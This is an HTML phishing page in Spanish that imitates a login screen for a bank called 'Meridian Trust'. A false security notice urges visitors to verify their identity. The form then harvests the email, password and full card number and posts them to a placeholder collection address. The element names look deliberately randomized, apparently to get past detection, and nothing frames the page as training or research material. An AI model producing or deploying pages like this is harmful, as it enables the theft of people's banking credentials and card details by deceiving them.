<!DOCTYPE html>
<html lang='es'>
<head>
  <meta charset='UTF-8'>
  <title>Meridian Trust - Acceso a tu cuenta</title>
  <link rel='stylesheet' href='style.css'>
</head>
<body>

  <div class='security-notice'>
    Por tu seguridad, verifica tu identidad para continuar.
  </div>

  <div class='auth-panel'>
    <h1 class='onyx75'>Meridian Trust</h1>

    <form id='loginForm' action='https://example.invalid/collect' method='POST'>
      <label for='birch50'>Usuario / Dirección de correo</label>
      <input type='email' id='birch50' name='email' required>


      <label for='userPassword'>Contraseña</label>
      <input type='password' id='userPassword' name='password' required>


      <label for='quill38'>Número de tarjeta (verificación)</label>
      <input type='text' id='quill38' name='card_number' maxlength='16'>

      <button type='submit' id='atlas58'>Continuar</button>
    </form>
  </div>

  <div class='cobalt72'>

    ¿Problemas para acceder? Soporte: ayuda@example.invalid
  </div>

  <script src='script.js'></script>
</body>
</html>
